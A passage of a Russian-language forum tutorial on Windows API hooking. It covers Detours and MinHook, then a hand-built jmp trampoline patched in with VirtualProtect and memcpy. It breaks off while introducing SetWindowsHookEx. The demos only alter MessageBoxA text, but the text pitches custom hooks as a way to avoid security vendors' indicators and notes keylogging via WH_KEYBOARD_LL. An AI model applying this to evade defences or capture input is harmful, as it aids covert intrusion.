    printf(&quot;\t - lpCaption    : %s\n&quot;, lpCaption);

    return g_pMessageBoxA(hWnd, &quot;другой lpText&quot;, &quot;другой lpCaption&quot;, uType);
}

BOOL Unhook() {

    DWORD    dwDetoursErr = NULL;

      // Создание транзакции и её обновление
    if ((dwDetoursErr = DetourTransactionBegin()) != NO_ERROR) {
        printf(&quot;[!] DetourTransactionBegin завершилась ошибкой с кодом : %d \n&quot;, dwDetoursErr);
        return FALSE;
    }

    if ((dwDetoursErr = DetourUpdateThread(GetCurrentThread())) != NO_ERROR) {
        printf(&quot;[!] DetourUpdateThread завершилась ошибкой с кодом : %d \n&quot;, dwDetoursErr);
        return FALSE;
    }

      // Удаление хука из MessageBoxA
    if ((dwDetoursErr = DetourDetach((PVOID)&amp;g_pMessageBoxA, MyMessageBoxA)) != NO_ERROR) {
        printf(&quot;[!] DetourDetach завершилась ошибкой с кодом : %d \n&quot;, dwDetoursErr);
        return FALSE;
    }

      // Фактическое удаление хука происходит после `DetourTransactionCommit` - подтверждение транзакции
    if ((dwDetoursErr = DetourTransactionCommit()) != NO_ERROR) {
        printf(&quot;[!] DetourTransactionCommit завершилась ошибкой с кодом : %d \n&quot;, dwDetoursErr);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Основная функция</b><br />
<br />
Ранее показанные процедуры установки и удаления хука не включают в себя основную функцию. Основная функция представлена ниже, в ней просто вызываются подцепленные и не подцепленные версии MessageBoxA.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>int main() {

    // Будет выполнено - не подцеплено
    MessageBoxA(NULL, &quot;Что вы думаете о разработке вредоносных программ?&quot;, &quot;Оригинальное сообщение&quot;, MB_OK | MB_ICONQUESTION);

//------------------------------------------------------------------
    //  Установка хука
    if (!InstallHook())
        return -1;

//------------------------------------------------------------------
    // Не будет выполнено - будет запущена функция MyMessageBoxA вместо этого
    MessageBoxA(NULL, &quot;Разработка вредоносных программ - это плохо&quot;, &quot;Оригинальное сообщение&quot;, MB_OK | MB_ICONWARNING);

//------------------------------------------------------------------
    //  Удаление хука
    if (!Unhook())
        return -1;

//------------------------------------------------------------------
    //  Будет выполнено - хук удален
    MessageBoxA(NULL, &quot;Снова обычное сообщение&quot;, &quot;Оригинальное сообщение&quot;, MB_OK | MB_ICONINFORMATION);

      return 0;
}</code></pre>
	</div>
</div><br />
<b>Демо<br />
<br />
MessageBoxA (Unhooked)</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785204088.png"
		data-src="https://osint42.org/attachments/1746785204088-png.194/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785204088-png.194/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785204088.png"
			title="1746785204088.png"
			width="1409" height="855" loading="lazy" />
	</div><br />
<br />
<b>MessageBoxA (Hooked)</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785211187.png"
		data-src="https://osint42.org/attachments/1746785211187-png.195/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785211187-png.195/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785211187.png"
			title="1746785211187.png"
			width="1449" height="708" loading="lazy" />
	</div><br />
<br />
<b>MessageBoxA (Unhooked)</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785217820.png"
		data-src="https://osint42.org/attachments/1746785217820-png.196/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785217820-png.196/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785217820.png"
			title="1746785217820.png"
			width="1370" height="828" loading="lazy" />
	</div><br />
<br />
<b>Библиотека Minhook</b><br />
<br />
<a href="https://github.com/TsudaKageyu/minhook" target="_blank" class="link link--external" rel="noopener">Minhook</a> - это библиотека для хукинга, написанная на C, которая может быть использована для достижения API-хукинга. Она совместима как с 32-битными, так и с 64-битными приложениями на Windows и использует ассемблер x86/x64 для внутреннего хукинга, аналогично библиотеке Detours. По сравнению с другими библиотеками хукинга, MinHook проще и предлагает легковесные API, что делает работу с ней проще.<br />
<br />
<b>Использование библиотеки Minhook</b><br />
<br />
Как и библиотека Detours, библиотека Minhook требует статический .lib файл и заголовочный файл MinHook.h, которые должны быть включены в проект Visual Studio.<br />
<br />
<b>Функции API Minhook</b><br />
<br />
Библиотека Minhook работает, инициализируя структуру, которая содержит необходимую информацию, необходимую для установки или удаления хука.<br />
Это делается через API MH_Initialize, который инициализирует структуру HOOK_ENTRY в библиотеке. Затем используется функция MH_CreateHook для создания хуков, и MH_EnableHook используется для их активации. MH_DisableHook используется для удаления хуков, и, наконец, MH_Uninitialize используется для очистки инициализированной структуры.<br />
<br />
Функции перечислены ниже для удобства:<br />
<br />
MH_Initialize - Инициализация структуры HOOK_ENTRY.<br />
<br />
MH_CreateHook - Создание хуков.<br />
<br />
MH_EnableHook - Активация созданных хуков.<br />
<br />
MH_DisableHook - Удаление хуков.<br />
<br />
MH_Uninitialize - Очистка инициализированной структуры.<br />
<br />
API Minhook возвращает значение MH_STATUS, которое является пользовательским перечислением, расположенным в Minhook.h. Возвращаемый тип данных MH_STATUS указывает код ошибки указанной функции. Значение MH_OK, которое равно 0, возвращается, если функция выполняется успешно, и ненулевое значение возвращается в случае ошибки.<br />
<br />
<b>Стоит отметить, что функции MH_Initialize и MH_Uninitialize следует вызывать только один раз, в начале и в конце программы соответственно.<br />
<br />
Функция подмены (которая будет вызываться вместо API)</b><br />
Здесь тот же пример API MessageBoxA из предыдущего модуля, который будет подменяться и изменяться для выполнения другого сообщения.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>fnMessageBoxA g_pMessageBoxA = NULL;

INT WINAPI MyMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
printf(&quot;[+] Оригинальные параметры : \n&quot;);
printf(&quot;\t - lpText    : %s\n&quot;, lpText);
printf(&quot;\t - lpCaption    : %s\n&quot;, lpCaption);

return g_pMessageBoxA(hWnd, &quot;Разный lpText&quot;, &quot;Разный lpCaption&quot;, uType);
}</code></pre>
	</div>
</div><br />
Обратите внимание, что глобальная переменная g_pMessageBoxA используется для запуска окна сообщений, где g_pMessageBoxA - это указатель на оригинальный, не подмененный API MessageBoxA. Ей присваивается значение NULL, потому что вызов API Minhook MH_CreateHook инициализирует его для использования, в отличие от библиотеки Detours, где g_pMessageBoxA устанавливается вручную. Это делается для предотвращения возникновения проблемы цикла хукинга, о которой говорилось в предыдущем модуле.<br />
<br />
<b>Процедура хукинга Minhook</b><br />
<br />
Как упоминалось ранее, чтобы подменить конкретный API с помощью Minhook, сначала необходимо выполнить функцию MH_Initialize. Затем можно создать хуки с помощью MH_CreateHook и активировать их с помощью MH_EnableHook.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL InstallHook() {

DWORD     dwMinHookErr = NULL;

if ((dwMinHookErr = MH_Initialize()) != MH_OK) {
    printf(&quot;[!] MH_Initialize завершился с ошибкой : %d \n&quot;, dwMinHookErr);
    return FALSE;
}

// Установка хука на MessageBoxA, чтобы запускать MyMessageBoxA вместо него
// g_pMessageBoxA будет указателем на оригинальную функцию MessageBoxA
if ((dwMinHookErr = MH_CreateHook(&amp;MessageBoxA, &amp;MyMessageBoxA, &amp;g_pMessageBoxA)) != MH_OK) {
    printf(&quot;[!] MH_CreateHook завершился с ошибкой : %d \n&quot;, dwMinHookErr);
    return FALSE;
}

// Активация хука на MessageBoxA
if ((dwMinHookErr = MH_EnableHook(&amp;MessageBoxA)) != MH_OK) {
    printf(&quot;[!] MH_EnableHook завершился с ошибкой : %d \n&quot;, dwMinHookErr);
    return -1;
}

return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Процедура отмены хукинга Minhook</b><br />
<br />
В отличие от библиотеки Detours, библиотека Minhook не требует использования транзакций. Вместо этого, чтобы удалить хук, единственное требование - это запустить API MH_DisableHook с адресом подмененной функции. Вызов MH_Uninitialize необязателен, но он очищает структуру, инициализированную предыдущим вызовом MH_Initialize.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL Unhook() {

DWORD     dwMinHookErr = NULL;

if ((dwMinHookErr = MH_DisableHook(&amp;MessageBoxA)) != MH_OK) {
    printf(&quot;[!] MH_DisableHook завершился с ошибкой : %d \n&quot;, dwMinHookErr);
    return -1;
}

if ((dwMinHookErr = MH_Uninitialize()) != MH_OK) {
    printf(&quot;[!] MH_Uninitialize завершился с ошибкой : %d \n&quot;, dwMinHookErr);
    return -1;
}
}</code></pre>
	</div>
</div><br />
<b>Главная функция</b><br />
<br />
Ранее показанные процедуры хукинга и отмены хукинга не включают главную функцию. Главная функция представлена ниже, она просто вызывает подмененные и не подмененные версии MessageBoxA.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>int main() {

// будет выполняться
MessageBoxA(NULL, &quot;Что вы думаете о разработке вредоносных программ?&quot;, &quot;Оригинальное сообщение&quot;, MB_OK | MB_ICONQUESTION);

// подмена
if (!InstallHook())
    return -1;

// не будет выполняться - подменено
MessageBoxA(NULL, &quot;Разработка вредоносных программ - это плохо&quot;, &quot;Оригинальное сообщение&quot;, MB_OK | MB_ICONWARNING);

// отмена подмены
if (!Unhook())
    return -1;

// будет выполняться - хук отключен
MessageBoxA(NULL, &quot;Снова обычное сообщение&quot;, &quot;Оригинальное сообщение&quot;, MB_OK | MB_ICONINFORMATION);

return 0;
}</code></pre>
	</div>
</div><br />
<b>API Hooking - Собственный код<br />
<br />
Введение</b><br />
<br />
До сих пор для реализации API-хукинга использовались открытые библиотеки. Однако основная проблема этого подхода заключается в том, что исходный код этих библиотек доступен публично, что позволяет исследователям в области безопасности и поставщикам продуктов безопасности создавать IoC(Indicators of compromise). По этой причине в этом модуле API-хукинг будет реализован вручную, хотя и не так изощренно, как в ранее продемонстрированных библиотеках, но достаточно для достижения желаемого результата без IoC.<br />
<br />
Собственный код для хукинга может быть лучшим решением, если задача - установить хук на одну функцию. Это позволяет избежать дополнительных усилий по связыванию других библиотек и уменьшает их влияние на размер бинарного файла.<br />
<br />
<b>Создание трамплинного шеллкода</b><br />
<br />
Один из способов установки хука на функцию - перезаписать её первые несколько инструкций новыми. Эти новые инструкции - это трамплин, который отвечает за изменение потока выполнения функции на заменяющую функцию. Типичным трамплином является небольшой jmp-шеллкод, который выполняет инструкцию jmp к адресу функции, которая должна быть выполнена. Чтобы выполнить инструкцию jmp, адрес, к которому нужно перейти, должен быть сохранен в регистре. В представленном примере регистром будет eax на 32-битном процессоре и r10 на 64-битном процессоре. Инструкция mov будет использоваться для сохранения адреса в этих регистрах.<br />
<br />
Этого достаточно для трамплина: инструкции mov и jmp. Глубокое погружение в то, как используются эти инструкции, не является целью этой статьи. Если вы хотите узнать больше, то можно посетить felixcloutier.com/x86/mov и felixcloutier.com/x86/jmp для получения дополнительной информации.<br />
<br />
<b>64-битный Jump Shellcode</b><br />
<br />
64-битный jump-шеллкод должен выглядеть следующим образом:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>mov r10, pAddress
jmp r10</code></pre>
	</div>
</div><br />
Где pAddress - это адрес функции, к которой нужно перейти (например, 0x0000FFFEC32A300). Чтобы использовать эти инструкции в коде, их сначала нужно преобразовать в опкоды.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, pAddress
0x41, 0xFF, 0xE2                                            // jmp r10</code></pre>
	</div>
</div><br />
32-битный Jump Shellcode А версия для 32-бит:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>mov eax, pAddress
jmp eax</code></pre>
	</div>
</div><br />
Также нужно преобразовать инструкции в опкоды.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>0xB8, 0x00, 0x00, 0x00, 0x00,     // mov eax, pAddress
0xFF, 0xE0                        // jmp eax</code></pre>
	</div>
</div><br />
Следует отметить, что pAddress представлено как NULL, что объясняет последовательность 0x00. Эти опкоды 0x00 являются заполнителями <b>и будут перезаписаны во время выполнения.<br />
<br />
Получение pAddress</b><br />
<br />
Поскольку хуки устанавливаются во время выполнения, значение pAddress должно быть получено и добавлено в шеллкод во время выполнения. Получение адреса можно выполнить с помощью GetProcAddress, и после этого использовать memcpy для копирования адреса в правильное место в шеллкоде.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>//64-битное пропатчивание
uint8_t        uTrampoline[] = {
            0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, pFunctionToRun
            0x41, 0xFF, 0xE2                                            // jmp r10
};
uint64_t uPatch = (uint64_t)pAddress;
memcpy(&amp;uTrampoline[2], &amp;uPatch, sizeof(uPatch)); // копирование адреса в смещение &#039;2&#039; в uTrampoline</code></pre>
	</div>
</div><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>//32-битное пропатчивание
uint8_t        uTrampoline[] = {
       0xB8, 0x00, 0x00, 0x00, 0x00,     // mov eax, pFunctionToRun
       0xFF, 0xE0                        // jmp eax
};
uint32_t uPatch = (uint32_t)pAddress;
memcpy(&amp;uTrampoline[1], &amp;uPatch, sizeof(uPatch)); // копирование адреса в смещение &#039;1&#039; в uTrampoline</code></pre>
	</div>
</div><br />
Как упоминалось ранее, pAddress - это адрес функции, к которой нужно перейти. Типы данных uint32_t и uint64_t используются для обеспечения правильного количества байтов адреса, то есть 4 байта для 32-битных машин и 8 байтов для 64-битных машин. uint32_t имеет размер 4 байта, а uint64_t - 8 байтов. Затем memcpy поместит адрес в трамплин, перезаписывая байты-заполнители 0x00.<br />
<br />
<b>Запись трамплина</b><br />
<br />
Перед перезаписью первых нескольких инструкций целевой функции подготовленным шеллкодом важно пометить память, в которой будет записан трамплин, как доступную для записи. В большинстве случаев регион памяти не будет доступен для записи, что потребует использования WinAPI VirtualProtect для изменения разрешений памяти на PAGE_EXECUTE_READWRITE. Стоит отметить, что память должна быть доступна для записи и выполнения, потому что когда программа вызывает функцию, ей нужно выполнить инструкции, которые не будут разрешены в памяти, доступной только для записи.<br />
<br />
Исходя из этого, трамплин должен сначала изменить разрешения целевой функции, а затем скопировать над ним шеллкод.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Изменение разрешений памяти в &#039;pFunctionToHook&#039; на PAGE_EXECUTE_READWRITE
if (!VirtualProtect(pFunctionToHook, sizeof(uTrampoline), PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {
    return FALSE;
}
// Копирование трамплинового шеллкода в &#039;pFunctionToHook&#039;
memcpy(pFunctionToHook, uTrampoline, sizeof(uTrampoline));</code></pre>
	</div>
</div><br />
Где pFunctionToHook - это адрес функции для установки хука, а uTrampoline - это jmp-шеллкод.<br />
<br />
<b>Отключение хука</b><br />
<br />
Когда вызывается захваченная функция, трамплиновый шеллкод должен работать как для 64-битных, так и для 32-битных архитектур. Однако отключение захваченной функции не обсуждалось. Для этого оригинальные байты, которые были перезаписаны трамплином, следует восстановить, используя буфер, содержащий эти байты, который был создан до установки трамплинового шеллкода. Затем этот буфер следует использовать как исходный буфер в функции memcpy при отключении функции.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>memcpy(pFunctionToHook, pOriginalBytes, sizeof(pOriginalBytes));</code></pre>
	</div>
</div><br />
Где pFunctionToHook - это адрес захваченной функции, а pOriginalBytes - это буфер, который содержит оригинальные байты функции, которые должны были быть сохранены до установки хука, и это можно сделать с помощью вызова memcpy. Размер буфера pOriginalBytes должен быть таким же, как размер трамплинового шеллкода, таким образом, будет перезаписан только шеллкод. Наконец, рекомендуется восстановить разрешения памяти, что можно сделать с помощью приведенного ниже кода.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>if (!VirtualProtect(pFunctionToHook, sizeof(uTrampoline), dwOldProtection, &amp;dwOldProtection)) {
    return FALSE;
}</code></pre>
	</div>
</div><br />
Где dwOldProtection - это старое разрешение памяти, возвращаемое первым вызовом VirtualProtect.<br />
<br />
<b>Структура HookSt </b><br />
<br />
Чтобы упростить реализацию, была создана структура HookSt. Эта структура будет содержать необходимую информацию для установки и отключения хука на определенную функцию. Значение TRAMPOLINE_SIZE установлено на 13, если программа компилируется как 64-битное приложение, и установлено на 7, если программа компилируется в режиме 32-бит. Значения 13 и 7 - это размеры трамплинового шеллкода, указанные в переменной uTrampoline, представленной ранее, для 64-битных и 32-битных систем соответственно.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _HookSt{

    PVOID    pFunctionToHook;                  // адрес функции для установки хука
    PVOID    pFunctionToRun;                   // адрес функции для выполнения вместо
    BYTE    pOriginalBytes[TRAMPOLINE_SIZE];  // буфер для сохранения некоторых оригинальных байтов (необходим для очистки)
    DWORD    dwOldProtection;                  // сохраняет старое разрешение памяти по адресу &quot;функции для установки хука&quot; (необходимо для очистки)

}HookSt, *PHookSt;</code></pre>
	</div>
</div><br />
Установка значения TRAMPOLINE_SIZE выполняется с помощью следующего препроцессорного кода:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// если компиляция как 64-бит
#ifdef _M_X64
#define TRAMPOLINE_SIZE        13
#endif // _M_X64
// если компиляция как 32-бит
#ifdef _M_IX86
#define TRAMPOLINE_SIZE        7
#endif // _M_IX86</code></pre>
	</div>
</div><br />
<b>Установка хуков</b><br />
<br />
Следующая функция использует HookSt для установки хуков.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL InstallHook (IN PHookSt Hook) {

#ifdef _M_X64
// 64-битный трамплин
    uint8_t    uTrampoline [] = {
            0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, pFunctionToRun
            0x41, 0xFF, 0xE2                                            // jmp r10
    };

    // Пропатчивание шеллкода адресом для перехода (pFunctionToRun)
    uint64_t uPatch = (uint64_t)(Hook-&gt;pFunctionToRun);
    // Копирование адреса функции для перехода в смещение &#039;2&#039; в uTrampoline
    memcpy(&amp;uTrampoline[2], &amp;uPatch, sizeof(uPatch));
#endif // _M_X64

#ifdef _M_IX86
// 32-битный трамплин
    uint8_t    uTrampoline[] = {
       0xB8, 0x00, 0x00, 0x00, 0x00,     // mov eax, pFunctionToRun
       0xFF, 0xE0                        // jmp eax
    };

    // Пропатчивание шеллкода адресом для перехода (pFunctionToRun)
    uint32_t uPatch = (uint32_t)(Hook-&gt;pFunctionToRun);
    // Копирование адреса функции для перехода в смещение &#039;1&#039; в uTrampoline
    memcpy(&amp;uTrampoline[1], &amp;uPatch, sizeof(uPatch));
#endif // _M_IX86

    // Размещение трамплинной функции - установка хука
    memcpy(Hook-&gt;pFunctionToHook, uTrampoline, sizeof(uTrampoline));

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Снятие хуков</b><br />
<br />
Функция ниже использует HookSt для снятия хуков.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL RemoveHook (IN PHookSt Hook) {

    DWORD    dwOldProtection        = NULL;

    // Копирование оригинальных байтов назад
    memcpy(Hook-&gt;pFunctionToHook, Hook-&gt;pOriginalBytes, TRAMPOLINE_SIZE);
    // Очистка нашего буфера
    memset(Hook-&gt;pOriginalBytes, &#039;\0&#039;, TRAMPOLINE_SIZE);
    // Установка старого разрешения памяти обратно в то, что было до установки хука
    if (!VirtualProtect(Hook-&gt;pFunctionToHook, TRAMPOLINE_SIZE, Hook-&gt;dwOldProtection, &amp;dwOldProtection)) {
        printf(&quot;[!] VirtualProtect Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Установка всех значений в null
    Hook-&gt;pFunctionToHook   = NULL;
    Hook-&gt;pFunctionToRun    = NULL;
    Hook-&gt;dwOldProtection   = NULL;

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Заполнение структуры HookSt</b><br />
<br />
Функция InitializeHookStruct используется для заполнения структуры HookSt необходимой информацией для установки хука.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL InitializeHookStruct(IN PVOID pFunctionToHook, IN PVOID pFunctionToRun, OUT PHookSt Hook) {

    // Заполнение структуры
    Hook-&gt;pFunctionToHook   = pFunctionToHook;
    Hook-&gt;pFunctionToRun    = pFunctionToRun;

    // Сохранение оригинальных байтов того же размера, который мы будем перезаписывать (то есть TRAMPOLINE_SIZE)
    // Это делается для возможности выполнения очистки при завершении
    memcpy(Hook-&gt;pOriginalBytes, pFunctionToHook, TRAMPOLINE_SIZE);

    // Изменение разрешения на RWX, чтобы можно было изменять байты
    // Мы сохраняем старое разрешение в структуре (для последующего восстановления)
    if (!VirtualProtect(pFunctionToHook, TRAMPOLINE_SIZE, PAGE_EXECUTE_READWRITE, &amp;Hook-&gt;dwOldProtection)) {
        printf(&quot;[!] VirtualProtect Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Основная функция</b><br />
<br />
Основная функция ниже вызывает ранее продемонстрированные функции и устанавливает хук на WinAPI MessageBoxA.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>int main() {

    // Инициализация структуры (необходима до установки/снятия хука)
    HookSt st = { 0 };

    if (!InitializeHookStruct(&amp;MessageBoxA, &amp;MyMessageBoxA, &amp;st)) {
        return -1;
    }

    // будет запущено
    MessageBoxA(NULL, &quot;Что вы думаете о разработке вредоносного ПО?&quot;, &quot;Оригинальное сообщение&quot;, MB_OK | MB_ICONQUESTION);

    // установка хука
    if (!InstallHook(&amp;st)) {
        return -1;
    }

    // не будет запущено - с хуком
    MessageBoxA(NULL, &quot;Разработка вредоносного ПО - это плохо&quot;, &quot;Оригинальное сообщение&quot;, MB_OK | MB_ICONWARNING);

    // снятие хука
    if (!RemoveHook(&amp;st)) {
        return -1;
    }

    // будет запущено - хук отключен
    MessageBoxA(NULL, &quot;Обычное сообщение снова&quot;, &quot;Оригинальное сообщение&quot;, MB_OK | MB_ICONINFORMATION);

    return 0;
}</code></pre>
	</div>
</div><br />
<b>Перехват API - Использование API Windows</b><br />
<br />
Вызов WinAPI SetWindowsHookEx является альтернативным методом перехвата API. Он преимущественно используется для отслеживания определенных типов системных событий, что отличается от техник, используемых в предыдущих модулях, так как SetWindowsHookExW/A не изменяет функциональность функции, а вместо этого выполняет обратный вызов функции каждый раз, когда происходит определенное событие.<br />
<br />
Типы событий ограничены теми, что предоставляет Windows.<br />
<br />
<b>Использование SetWindowsHookEx</b><br />
<br />
WinAPI SetWindowsHookExW показан ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>HHOOK SetWindowsHookExW(
  [вход] int       idHook,      // Тип процедуры перехвата, который будет установлен
  [вход] HOOKPROC  lpfn,        // Указатель на процедуру перехвата (функцию для выполнения)
  [вход] HINSTANCE hmod,        // Дескриптор DLL, содержащей процедуру перехвата (это оставляют как NULL)
  [вход] DWORD     dwThreadId   // Id потока, с которым будет ассоциирована процедура перехвата (это оставляют как NULL)
);</code></pre>
	</div>
</div><br />
idHook - Событие, которое будет отслеживаться. Например, флаг WH_KEYBOARD_LL используется для отслеживания сообщений нажатия клавиш, которые могут действовать как кейлоггер.<br />
Обратите внимание, что использование SetWindowsHookEx для кейлоггинга - старый трюк. В этой статье будет использоваться флаг WH_MOUSE_LL для отслеживания кликов мыши.<br />
<br />
lpfn - Указатель на функцию обратного вызова, которая выполняется всякий раз, когда происходит указанное событие. В данном случае функция будет выполняться при каждом клике мыши.<br />
<br />
<b>Функция обратного вызова</b><br />
<br />
Функция обратного вызова должна быть типа HOOKPROC, который показан ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
